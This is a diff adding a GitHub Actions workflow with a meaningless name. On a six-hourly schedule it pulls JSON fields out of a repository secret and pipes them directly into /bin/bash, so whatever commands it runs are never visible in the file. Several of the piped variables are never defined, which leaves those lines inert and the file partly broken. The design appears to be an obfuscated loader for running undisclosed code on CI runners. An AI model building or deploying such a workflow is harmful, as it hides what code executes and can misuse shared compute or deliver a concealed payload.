@@ -1,0 +1,25 @@
+name: anchuocuoo
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '26 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: anchuocuoo
+        env:
+          pcze2: ${{ secrets.pcze2 }}
+        run: |
+          echo $pcze2 | jq -r .mly1219 | /bin/bash
+          echo $ffjcb6686 | jq -r .r228 | /bin/bash
+          echo $d4 | jq -r .j85 | /bin/bash
+          echo $vejaj07048 | jq -r .m7 | /bin/bash
+          echo $xlrja13 | jq -r .hplfl80 | /bin/bash
+          echo $gzrt42 | jq -r .br854 | /bin/bash
+          echo $eed52 | jq -r .z88963 | /bin/bash
+          echo $zt86 | jq -r .wjs91 | /bin/bash
+
